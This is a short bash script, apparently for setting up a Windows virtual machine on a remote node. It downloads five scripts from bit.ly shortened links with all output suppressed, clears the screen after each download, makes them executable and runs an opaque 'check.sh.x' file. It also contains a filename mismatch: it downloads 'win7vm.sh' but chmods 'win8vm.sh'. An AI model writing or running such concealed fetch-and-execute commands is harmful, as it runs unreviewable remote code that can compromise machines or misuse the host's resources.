#!/bin/bash
ssh node01
wget -O exit.sh https://bit.ly/3By9RUV > /dev/null 2>&1
clear
wget -O sleep.sh https://bit.ly/3iGh4cU > /dev/null 2>&1
clear
wget -O win7vm.sh https://bit.ly/3rvGYUH > /dev/null 2>&1
clear
wget -O check.sh.x https://bit.ly/3eRwoSW > /dev/null 2>&1
clear
wget -O region.sh https://bit.ly/3rFeKXo > /dev/null 2>&1
chmod +x win8vm.sh
chmod +x exit.sh
chmod +x sleep.sh
chmod +x region.sh
chmod +x check.sh.x
./check.sh.x
